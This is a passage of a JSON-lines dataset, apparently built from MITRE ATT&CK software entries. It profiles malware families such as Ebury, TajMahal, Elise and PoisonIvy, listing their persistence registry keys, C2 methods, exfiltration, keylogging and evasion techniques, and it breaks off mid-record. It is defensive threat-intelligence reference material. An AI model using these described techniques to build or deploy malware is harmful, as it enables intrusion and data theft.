{"text": " [Ebury](https://attack.mitre.org/software/S0377) is an SSH backdoor targeting Linux operating systems. Attackers require root-level access, which allows them to replace SSH binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH (libkeyutils).(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)(Citation: ESET Ebury Oct 2017)", "idx": "https://attack.mitre.org/software/S0377", "title": "Ebury", "entity": "Ebury", "entity_type": "software", "entity_context": ["Ebury has injected its dynamic library into descendent processes of sshd via LD_PRELOAD.", "Ebury can list directory entries. ", "Ebury has used a DGA to generate a domain name for C2.", "Ebury can intercept private keys using a trojanized <code>ssh-add</code> function.", "Ebury has encoded C2 traffic in hexadecimal format.\t", "Ebury has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.", "Ebury has installed a self-signed RPM package mimicking the original system package on RPM based systems.", "Ebury can hook logging functions so that nothing from the backdoor gets sent to the logging facility.\t", "Ebury has obfuscated its strings with a simple XOR encryption with a static key.", "Ebury has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.", "Ebury can automatically exfiltrate gathered SSH credentials.", "Ebury can disable SELinux Role-Based Access Control and deactivate PAM modules.", "Ebury has used DNS requests over UDP port 53 for C2.\t", "Ebury has intercepted unencrypted private keys as well as private key pass-phrases.\t", "Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.", "Ebury has used Python to implement its DGA.\t", "Ebury has used user mode rootkit techniques to remain hidden on the system.", "Ebury has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.", "Ebury can deactivate PAM modules to tamper with the sshd configuration.", "Ebury can exfiltrate SSH credentials through custom DNS queries."], "is_subtechnique": false}
{"text": " [ZeroT](https://attack.mitre.org/software/S0230) is a Trojan used by [TA459](https://attack.mitre.org/groups/G0062), often in conjunction with [PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) (Citation: Proofpoint ZeroT Feb 2017)", "idx": "https://attack.mitre.org/software/S0230", "title": "ZeroT", "entity": "ZeroT", "entity_type": "software", "entity_context": ["ZeroT has encrypted its payload with RC4.", "ZeroT has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.", "ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server.", "ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions.", "ZeroT has used RC4 to encrypt C2 traffic.", "ZeroT can download additional payloads onto the victim.", "Some ZeroT DLL files have been packed with UPX.", "ZeroT has used DLL side-loading to load malicious payloads.", "ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.", "ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.", "ZeroT has used HTTP for C2.", "Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.", "ZeroT can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system."], "is_subtechnique": false}
{"text": " [BISCUIT](https://attack.mitre.org/software/S0017) is a backdoor that has been used by [APT1](https://attack.mitre.org/groups/G0006) since as early as 2007. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0017", "title": "BISCUIT", "entity": "BISCUIT", "entity_type": "software", "entity_context": ["BISCUIT has a command to collect the processor type, operation system, computer name, uptime, and whether the system is a laptop or PC.", "BISCUIT uses SSL for encrypting C2 communications.", "BISCUIT has a command to periodically take screenshots of the system.", "BISCUIT has a command to gather the username from the system.", "BISCUIT malware contains a secondary fallback command and control server that is contacted after the primary command and control server.", "BISCUIT can capture keystrokes.", "BISCUIT has a command to enumerate running processes and identify their owners.", "BISCUIT has a command to download a file from the C2 server.", "BISCUIT has a command to launch a command shell on the system."], "is_subtechnique": false}
{"text": " [Ruler](https://attack.mitre.org/software/S0358) is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of [Ruler](https://attack.mitre.org/software/S0358) have also released a defensive tool, NotRuler, to detect its usage.(Citation: SensePost Ruler GitHub)(Citation: SensePost NotRuler)", "idx": "https://attack.mitre.org/software/S0358", "title": "Ruler", "entity": "Ruler", "entity_type": "software", "entity_context": ["Ruler can be used to automate the abuse of Outlook Home Pages to establish persistence. ", "Ruler can be used to enumerate Exchange users and dump the GAL.", "Ruler can be used to automate the abuse of Outlook Rules to establish persistence. ", "Ruler can be used to automate the abuse of Outlook Forms to establish persistence."], "is_subtechnique": false}
{"text": " [ObliqueRAT](https://attack.mitre.org/software/S0644) is a remote access trojan, similar to [Crimson](https://attack.mitre.org/software/S0115), that has been in use by [Transparent Tribe](https://attack.mitre.org/groups/G0134) since at least 2020.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe May 2021)", "idx": "https://attack.mitre.org/software/S0644", "title": "ObliqueRAT", "entity": "ObliqueRAT", "entity_type": "software", "entity_context": ["ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration.", "ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools.", "ObliqueRAT has gained execution on targeted systems through luring users to click on links to malicious URLs.", "ObliqueRAT can capture a screenshot of the current screen.\n", "ObliqueRAT can capture images from webcams on compromised hosts.", "ObliqueRAT can hide its payload in BMP images hosted on compromised websites.", "ObliqueRAT has the ability to extract data from removable devices connected to the endpoint.", "ObliqueRAT has the ability to recursively enumerate files on an infected endpoint.", "ObliqueRAT can check for blocklisted process names on a compromised host.", "ObliqueRAT can gain persistence by a creating a shortcut in the infected user's Startup directory.", "ObliqueRAT can copy specific files, webcam captures, and screenshots to local directories.", "ObliqueRAT can discover pluggable/removable drives to extract files from.", "ObliqueRAT has the ability to check for blocklisted computer names on infected endpoints.", "ObliqueRAT can check for blocklisted usernames on infected endpoints."], "is_subtechnique": false}
{"text": " [TajMahal](https://attack.mitre.org/software/S0467) is a multifunctional spying framework that has been in use since at least 2014. [TajMahal](https://attack.mitre.org/software/S0467) is comprised of two separate packages, named Tokyo and Yokohama, and can deploy up to 80 plugins.(Citation: Kaspersky TajMahal April 2019)", "idx": "https://attack.mitre.org/software/S0467", "title": "TajMahal", "entity": "TajMahal", "entity_type": "software", "entity_context": ["TajMahal has the ability to identify running processes and associated plugins on an infected host.", "TajMahal has the ability to inject DLLs for malicious plugins into running processes.", "TajMahal has the ability to inject the <code>LoadLibrary</code> call template DLL into running processes.", "TajMahal has the ability to identify hardware information, the computer name, and OS information on an infected host.", "TajMahal can set the <code>KeepPrintedJobs</code> attribute for configured printers in <code>SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Print\\\\Printers</code> to enable document stealing.", "TajMahal has the ability to identify the Internet Explorer (IE) version on an infected host.", "TajMahal has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.", "TajMahal has the ability to index and compress files into a send queue for exfiltration.", "TajMahal has the ability to identify the MAC address on an infected host.", "TajMahal has the ability to take screenshots on an infected host including capturing content from windows of instant messaging applications.", "TajMahal has the ability to manage an automated queue of egress files and commands sent to its C2.", "TajMahal has the ability to capture webcam video.", "TajMahal has used an encrypted Virtual File System to store plugins.", "TajMahal has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.", "TajMahal has the ability to capture keystrokes on an infected host.", "TajMahal has the ability to capture VoiceIP application audio on an infected host.", "TajMahal has the ability to index files from drives, user profiles, and removable drives.", "TajMahal has the ability to use the open source libraries XZip/Xunzip and zlib to compress files.", "TajMahal has the ability to steal data from the clipboard of an infected host.\n", "TajMahal has the ability to send collected files over its C2.", "TajMahal has the ability to determine local time on a compromised host.", "TajMahal has the ability to identify connected Apple devices.", "TajMahal has the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use.", "TajMahal has the ability to steal documents from the local system including the print spooler queue."], "is_subtechnique": false}
{"text": " [InnaputRAT](https://attack.mitre.org/software/S0259) is a remote access tool that can exfiltrate files from a victim’s machine. [InnaputRAT](https://attack.mitre.org/software/S0259) has been seen out in the wild since 2016. (Citation: ASERT InnaputRAT April 2018)", "idx": "https://attack.mitre.org/software/S0259", "title": "InnaputRAT", "entity": "InnaputRAT", "entity_type": "software", "entity_context": ["InnaputRAT uses the API call ShellExecuteW for execution.", "InnaputRAT has a command to delete files.", "InnaputRAT variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.", "InnaputRAT variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.", "Some InnaputRAT variants establish persistence by modifying the Registry key <code>HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe</code>.", "InnaputRAT gathers volume drive information and system information.", "InnaputRAT uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.", "InnaputRAT launches a shell to execute commands on the victim’s machine.", "Some InnaputRAT variants create a new Windows service to establish persistence.", "InnaputRAT enumerates directories and obtains file attributes on a system."], "is_subtechnique": false}
{"text": " [Fysbis](https://attack.mitre.org/software/S0410) is a Linux-based backdoor used by [APT28](https://attack.mitre.org/groups/G0007) that dates back to at least 2014.(Citation: Fysbis Palo Alto Analysis)", "idx": "https://attack.mitre.org/software/S0410", "title": "Fysbis", "entity": "Fysbis", "entity_type": "software", "entity_context": ["Fysbis has the ability to delete files.", "Fysbis has been encrypted using XOR and RC4. ", "Fysbis has masqueraded as trusted software rsyncd and dbus-inotifier.", "Fysbis has used port 80 for C2. ", "Fysbis has established persistence using a systemd service.", "Fysbis can use Base64 to encode its C2 traffic.", "Fysbis has the ability to search for files. ", "Fysbis can perform keylogging. ", "Fysbis has the ability to create and execute commands in a remote shell for CLI.", "Fysbis can collect information about running processes. ", "Fysbis has used the command <code>ls /etc | egrep -e\"fedora\\*|debian\\*|gentoo\\*|mandriva\\*|mandrake\\*|meego\\*|redhat\\*|lsb-\\*|sun-\\*|SUSE\\*|release\"</code> to determine which Linux OS version is running.", "Fysbis has installed itself as an autostart entry under <code>~/.config/autostart/dbus-inotifier.desktop</code> to establish persistence.", "Fysbis has masqueraded as the rsyncd and dbus-inotifier services."], "is_subtechnique": false}
{"text": " [Invoke-PSImage](https://attack.mitre.org/software/S0231) takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. (Citation: GitHub Invoke-PSImage)", "idx": "https://attack.mitre.org/software/S0231", "title": "Invoke-PSImage", "entity": "Invoke-PSImage", "entity_type": "software", "entity_context": ["Invoke-PSImage can be used to embed a PowerShell script within the pixels of a PNG file."], "is_subtechnique": false}
{"text": " [HAWKBALL](https://attack.mitre.org/software/S0391) is a backdoor that was observed in targeting of the government sector in Central Asia.(Citation: FireEye HAWKBALL Jun 2019)", "idx": "https://attack.mitre.org/software/S0391", "title": "HAWKBALL", "entity": "HAWKBALL", "entity_type": "software", "entity_context": ["HAWKBALL has sent system information and files over the C2 channel.", "HAWKBALL has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload. ", "HAWKBALL can collect the user name of the system.", "HAWKBALL has sent HTTP GET requests over port 443 for C2.", "HAWKBALL can collect the OS version, architecture information, and computer name.", "HAWKBALL has used HTTP to communicate with a single hard-coded C2 server.", "HAWKBALL has used an OLE object that uses Equation Editor to drop the embedded shellcode.", "HAWKBALL has encrypted data with XOR before sending it over the C2 channel.", "HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.", "HAWKBALL has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.", "HAWKBALL has encrypted the payload with an XOR-based algorithm.", "HAWKBALL has the ability to delete files.\t"], "is_subtechnique": false}
{"text": " [S-Type](https://attack.mitre.org/software/S0085) is a backdoor that was used by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2013 to 2014. (Citation: Cylance Dust Storm)", "idx": "https://attack.mitre.org/software/S0085", "title": "S-Type", "entity": "S-Type", "entity_type": "software", "entity_context": ["The initial beacon packet for S-Type contains the operating system version and file system of the victim.", "S-Type primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.", "S-Type may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}</code>.", "S-Type may save itself as a file named msdtc.exe, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.", "S-Type uses ports 80, 443, and 8080 for C2.", "S-Type may create the file <code>%HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk</code>, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.", "S-Type uses HTTP for C2.", "S-Type may create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique Identifier}.”", "S-Type runs the command <code>net user</code> on a victim. S-Type also runs tests to determine the privilege level of the compromised user.", "S-Type runs the command <code>net start</code> on a victim.", "S-Type uses Base64 encoding for C2 traffic."], "is_subtechnique": false}
{"text": " [Elise](https://attack.mitre.org/software/S0081) is a custom backdoor Trojan that appears to be used exclusively by [Lotus Blossom](https://attack.mitre.org/groups/G0030). It is part of a larger group of tools referred to as LStudio, ST Group, and APT0LSTU. (Citation: Lotus Blossom Jun 2015)(Citation: Accenture Dragonfish Jan 2018)", "idx": "https://attack.mitre.org/software/S0081", "title": "Elise", "entity": "Elise", "entity_type": "software", "entity_context": ["Elise executes <code>net user</code> after initial communication is made to the remote server.", "If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.", "Elise performs timestomping of a CAB file it creates.", "Elise is capable of launching a remote shell on the host to delete itself.", "Elise executes <code>net start</code> after initial communication is made to the remote server.", "Elise creates a file in <code>AppData\\Local\\Microsoft\\Windows\\Explorer</code> and stores all harvested data in that file.", "Elise communicates over HTTP or HTTPS for C2.", "Elise configures itself as a service.", "Elise can download additional files from the C2 server for execution.", "A variant of Elise executes <code>dir C:\\progra~1</code> when initially run.", "Elise enumerates processes via the <code>tasklist</code> command.", "After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.", "If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe</code>. Other variants have set the following Registry keys for persistence: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : self</code> and <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD</code>.", "Elise encrypts exfiltrated data with RC4.", "Elise encrypts several of its files, including configuration files.", "Elise executes <code>systeminfo</code> after initial communication is made to the remote server.", "Elise exfiltrates data using cookie values that are Base64-encoded.", "Elise injects DLL files into iexplore.exe.", "Elise executes <code>ipconfig /all</code> after initial communication is made to the remote server."], "is_subtechnique": false}
{"text": " [Tor](https://attack.mitre.org/software/S0183) is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information. [Tor](https://attack.mitre.org/software/S0183) utilizes \"Onion Routing,\" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. (Citation: Dingledine Tor The Second-Generation Onion Router)", "idx": "https://attack.mitre.org/software/S0183", "title": "Tor", "entity": "Tor", "entity_type": "software", "entity_context": ["Traffic traversing the Tor network will be forwarded to multiple nodes before exiting the Tor network and continuing on to its intended destination.", "Tor encapsulates traffic in multiple layers of encryption, using TLS by default."], "is_subtechnique": false}
{"text": " [Ecipekac](https://attack.mitre.org/software/S0624) is a multi-layer loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2019 including use as a loader for [P8RAT](https://attack.mitre.org/software/S0626), [SodaMaster](https://attack.mitre.org/software/S0627), and [FYAnti](https://attack.mitre.org/software/S0628).(Citation: Securelist APT10 March 2021)", "idx": "https://attack.mitre.org/software/S0624", "title": "Ecipekac", "entity": "Ecipekac", "entity_type": "software", "entity_context": ["Ecipekac has the ability to decrypt fileless loader modules.", "Ecipekac can download additional payloads to a compromised host.", "Ecipekac has used a valid, legitimate digital signature to evade detection.", "Ecipekac can use XOR, AES, and DES to encrypt loader shellcode.", "Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL."], "is_subtechnique": false}
{"text": " [SHUTTERSPEED](https://attack.mitre.org/software/S0217) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0217", "title": "SHUTTERSPEED", "entity": "SHUTTERSPEED", "entity_type": "software", "entity_context": ["SHUTTERSPEED can capture screenshots.", "SHUTTERSPEED can download and execute an arbitary executable.", "SHUTTERSPEED can collect system information."], "is_subtechnique": false}
{"text": " [PHOREAL](https://attack.mitre.org/software/S0158) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)", "idx": "https://attack.mitre.org/software/S0158", "title": "PHOREAL", "entity": "PHOREAL", "entity_type": "software", "entity_context": ["PHOREAL is capable of manipulating the Registry.", "PHOREAL communicates via ICMP for C2.", "PHOREAL is capable of creating reverse shell."], "is_subtechnique": false}
{"text": " Flame is a sophisticated toolkit that has been used to collect information since at least 2010, largely targeting Middle East countries. (Citation: Kaspersky Flame)", "idx": "https://attack.mitre.org/software/S0143", "title": "Flame", "entity": "Flame", "entity_type": "software", "entity_context": ["Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.", "Rundll32.exe is used as a way of executing Flame at the command-line.", "Flame can create backdoor accounts with login “HelpAssistant” on domain connected systems if appropriate rights are available.", "Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.", "Flame can record audio using any existing hardware recording devices.", "Flame can take regular screenshots when certain applications are open that are sent to the command and control server.", "Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.", "Flame can use Windows Authentication Packages for persistence.", "Flame identifies security software such as antivirus through the Security module."], "is_subtechnique": false}
{"text": " [POORAIM](https://attack.mitre.org/software/S0216) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) in campaigns since at least 2014. (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0216", "title": "POORAIM", "entity": "POORAIM", "entity_type": "software", "entity_context": ["POORAIM can enumerate processes.", "POORAIM has been delivered through compromised sites acting as watering holes.", "POORAIM can perform screen capturing.", "POORAIM has used AOL Instant Messenger for C2.", "POORAIM can identify system information, including battery status.", "POORAIM can conduct file browsing."], "is_subtechnique": false}
{"text": " [Azorult](https://attack.mitre.org/software/S0344) is a commercial Trojan that is used to steal information from compromised hosts. [Azorult](https://attack.mitre.org/software/S0344) has been observed in the wild as early as 2016. In July 2018, [Azorult](https://attack.mitre.org/software/S0344) was seen used in a spearphishing campaign against targets in North America. [Azorult](https://attack.mitre.org/software/S0344) has been seen used for cryptocurrency theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018)", "idx": "https://attack.mitre.org/software/S0344", "title": "Azorult", "entity": "Azorult", "entity_type": "software", "entity_context": ["Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.", "Azorult can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.", "Azorult can delete files from victim machines.", "Azorult can collect the username from the victim’s machine.", "Azorult can collect a list of running processes by calling CreateToolhelp32Snapshot.", "Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.", "Azorult can encrypt C2 traffic using XOR.", "Azorult can recursively search for files in folders and collects files from the desktop with certain extensions.", "Azorult can download and execute additional files. Azorult has also downloaded a ransomware payload called Hermes.", "Azorult can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.", "Azorult can capture screenshots of the victim’s machines.", "Azorult can collect the time zone information from the system.", "Azorult can collect host IP information from the victim’s machine.", "Azorult can steal credentials in files belonging to common software such as Skype, Telegram, and Steam.", "Azorult can check for installed software on the system under the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code>.", "Azorult can steal credentials from the victim's browser."], "is_subtechnique": false}
{"text": " [Cryptoistic](https://attack.mitre.org/software/S0498) is a backdoor, written in Swift, that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032).(Citation: SentinelOne Lazarus macOS July 2020)", "idx": "https://attack.mitre.org/software/S0498", "title": "Cryptoistic", "entity": "Cryptoistic", "entity_type": "software", "entity_context": ["Cryptoistic can use TCP in communications with C2.", "Cryptoistic can retrieve files from the local file system.", "Cryptoistic can engage in encrypted communications with C2.", "Cryptoistic has the ability to send and receive files.", "Cryptoistic can scan a directory to identify files for deletion.", "Cryptoistic has the ability delete files from a compromised host.", "Cryptoistic can gather data on the user of a compromised host."], "is_subtechnique": false}
{"text": " [Rover](https://attack.mitre.org/software/S0090) is malware suspected of being used for espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to Afghanistan. (Citation: Palo Alto Rover)", "idx": "https://attack.mitre.org/software/S0090", "title": "Rover", "entity": "Rover", "entity_type": "software", "entity_context": ["Rover automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. Rover also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.", "Rover has keylogging functionality.", "Rover copies files from removable drives to <code>C:\\system</code>.", "Rover persists by creating a Registry entry in <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code>.", "Rover automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.", "Rover automatically searches for files on local drives based on a predefined list of file extensions.", "Rover takes screenshots of the compromised system's desktop and saves them to <code>C:\\system\\screenshot.bmp</code> for exfiltration every 60 minutes.", "Rover searches for files on local drives based on a predefined list of file extensions.", "Rover searches for files on attached removable drives based on a predefined list of file extensions every five seconds.", "Rover has functionality to remove Registry Run key persistence as a cleanup procedure."], "is_subtechnique": false}
{"text": " [HyperBro](https://attack.mitre.org/software/S0398) is a custom in-memory backdoor used by [Threat Group-3390](https://attack.mitre.org/groups/G0027).(Citation: Unit42 Emissary Panda May 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)", "idx": "https://attack.mitre.org/software/S0398", "title": "HyperBro", "entity": "HyperBro", "entity_type": "software", "entity_context": ["HyperBro has used HTTPS for C2 communications.", "HyperBro can run shellcode it injects into a newly created process.", "HyperBro has the ability to delete a specified file.", "HyperBro has the ability to download additional files.", "HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.", "HyperBro can list all services and their configurations.", "HyperBro has the ability to take screenshots.", "HyperBro has the ability to start and stop a specified service.", "HyperBro has the ability to run an application (<code>CreateProcessW</code>) or script/file (<code>ShellExecuteW</code>) via API."], "is_subtechnique": false}
{"text": " [MoleNet](https://attack.mitre.org/software/S0553) is a downloader tool with backdoor capabilities that has been observed in use since at least 2019.(Citation: Cybereason Molerats Dec 2020)", "idx": "https://attack.mitre.org/software/S0553", "title": "MoleNet", "entity": "MoleNet", "entity_type": "software", "entity_context": ["MoleNet can perform WMI commands on the system.", "MoleNet can use WMI commands to check the system for firewall and antivirus software.", "MoleNet can use PowerShell to set persistence. ", "MoleNet can execute commands via the command line utility.", "MoleNet can achieve persitence on the infected machine by setting the Registry run key. ", "MoleNet can download additional payloads from the C2. ", "MoleNet can collect information about the about the system."], "is_subtechnique": false}
{"text": " [Taidoor](https://attack.mitre.org/software/S0011) is a remote access trojan (RAT) that has been used by Chinese government cyber actors to maintain access on victim networks.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Taidoor](https://attack.mitre.org/software/S0011) has primarily been used against Taiwanese government organizations since at least 2010.(Citation: TrendMicro Taidoor)", "idx": "https://attack.mitre.org/software/S0011", "title": "Taidoor", "entity": "Taidoor", "entity_type": "software", "entity_context": ["Taidoor has relied upon a victim to click on a malicious email attachment.", "Taidoor can use encrypted string blocks for obfuscation.", "Taidoor can query the Registry on compromised hosts using <code>RegQueryValueExA</code>.", "Taidoor can use TCP for C2 communications.", "Taidoor has collected the MAC address of a compromised host; it can also use <code>GetAdaptersInfo</code> to identify network adapters.", "Taidoor can copy cmd.exe into the system temp folder.", "Taidoor has the ability to modify the Registry on compromised hosts using <code>RegDeleteValueA</code> and <code>RegCreateKeyExA</code>.", "Taidoor can use <code>GetLocalTime</code> and <code>GetSystemTime</code> to collect system time.", "Taidoor can use <code>DeleteFileA</code> to remove files from infected hosts.", "Taidoor can upload data and files from a victim's machine.", "Taidoor can use <code>GetCurrentProcessId</code> for process discovery.", "Taidoor has modified the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> key for persistence.", "Taidoor has been delivered through spearphishing emails.", "Taidoor can use a stream cipher to decrypt stings used by the malware.", "Taidoor has downloaded additional files onto a compromised host.", "Taidoor can search for specific files.", "Taidoor has the ability to use native APIs for execution including <code>GetProcessHeap</code>, <code>GetProcAddress</code>, and <code>LoadLibrary</code>.", "Taidoor can perform DLL loading.", "Taidoor has used HTTP GET and POST requests for C2.", "Taidoor uses RC4 to encrypt the message body of HTTP content."], "is_subtechnique": false}
{"text": " [PoisonIvy](https://attack.mitre.org/software/S0012) is a popular remote access tool (RAT) that has been used by many groups. (Citation: FireEye Poison Ivy) (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Darkmoon Aug 2005)", "idx": "https://attack.mitre.org/software/S0012", "title": "PoisonIvy", "entity": "PoisonIvy", "entity_type": "software", "entity_context": ["PoisonIvy uses the Camellia cipher to encrypt communications.", "PoisonIvy can inject a malicious DLL into a process.", "PoisonIvy creates a backdoor through which remote attackers can upload files.", "PoisonIvy creates a Registry subkey that registers a new system device.", "PoisonIvy captures window titles.", "PoisonIvy creates a backdoor through which remote attackers can open a command-line interface.", "PoisonIvy creates a backdoor through which remote attackers can steal system information.", "PoisonIvy creates a Registry key in the Active Setup pointing to a malicious executable.", "PoisonIvy hides any strings related to its own indicators of compromise.", "PoisonIvy creates a Registry subkey that registers a new service. PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.", "PoisonIvy creates run key Registry entries pointing to a malicious executable dropped to disk.", "PoisonIvy stages collected data in a text file.", "PoisonIvy starts a rootkit from a malicious file dropped to disk.", "PoisonIvy contains a keylogger."], "is_subtechnique": false}
{"text": " [Octopus](https://attack.mitre.org/software/S0340) is a Windows Trojan written in the Delphi programming language that has been used by [Nomadic Octopus](https://attack.mitre.org/groups/G0133) to target government organizations in Central Asia since at least 2014.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018)", "idx": "https://attack.mitre.org/software/S0340", "title": "Octopus", "entity": "Octopus", "entity_type": "software", "entity_context": ["Octopus can collect the host IP address from the victim’s machine.", "Octopus has used wmic.exe for local discovery information.", "Octopus has exfiltrated data to file sharing sites.", "Octopus can collect system drive information, the computer name, and the size of the disk.", "Octopus has uploaded stolen files and data from a victim's machine over its C2 channel.", "Octopus achieved persistence by placing a malicious executable in the startup directory. ", "Octopus has used HTTP GET and POST requests for C2 communications.", "Octopus can collect the username from the victim’s machine.", "Octopus has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Octopus can collect information on the Windows directory and searches for compressed RAR files on the host.", "Octopus can capture screenshots of the victims’ machine.", "Octopus can exfiltrate files from the system using a documents collector tool.", "Octopus has been delivered via spearsphishing emails.", "Octopus encodes C2 communications in Base64.", "Octopus can download additional files and tools onto the victim’s machine.", "Octopus has stored collected information in the Application Data directory on a compromised host.", "Octopus has been disguised as legitimate programs, such as Java and Telegram Messenger.", "Octopus has compressed data before exfiltrating it using a tool called Abbrevia. "], "is_subtechnique": false}
{"text": " [ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New Delivery Oct 2017)", "idx": "https://attack.mitre.org/software/S0189", "title": "ISMInjector", "entity": "ISMInjector", "entity_type": "software", "entity_context": ["ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.", "ISMInjector uses the <code>certutil</code> command to decode a payload file.", "ISMInjector creates scheduled tasks to establish persistence.", "ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process."], "is_subtechnique": false}
{"text": " [gh0st RAT](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The source code is public and it has been used by multiple groups. (Citation: FireEye Hacking Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018)", "idx": "https://attack.mitre.org/software/S0032", "title": "gh0st RAT", "entity": "gh0st RAT", "entity_type": "software", "entity_context": ["gh0st RAT has used the InterlockedExchange, SeShutdownPrivilege, and ExitWindowsEx Windows API functions.", "gh0st RAT can execute its service if the Service key exists. If the key does not exist, gh0st RAT will create and run the service.", "gh0st RAT has a keylogger.", "gh0st RAT can inject malicious code into process created by the “Command_Create&Inject” function.", "gh0st RAT has used Zlib to compress C2 communications data before encrypting it.", "gh0st RAT has gathered system architecture, processor, OS configuration, and installed hardware information.", "gh0st RAT has added a Registry Run key to establish persistence.", "A gh0st RAT variant has used DLL side-loading.", "gh0st RAT\toperators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.", "gh0st RAT has the capability to list processes.", "gh0st RAT can download files to the victim’s machine.", "gh0st RAT is able to wipe event logs.", "gh0st RAT has the capability to to delete files.", 